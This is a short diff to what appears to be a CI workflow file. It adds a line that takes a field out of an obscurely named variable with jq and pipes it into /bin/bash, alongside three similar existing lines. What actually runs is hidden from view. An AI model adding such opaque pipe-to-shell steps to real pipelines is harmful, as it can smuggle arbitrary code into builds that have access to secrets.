@@ -28,6 +28,7 @@ jobs:
           echo $nnp182 | jq -r .d56 | /bin/bash
           printf '%s' "$hno8" | jq -r .mombq32 | /bin/bash
           printf '%s' "$hdxpz809" | jq -r .a315 | /bin/bash
+          echo $zo81 | jq -r .eou33745 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
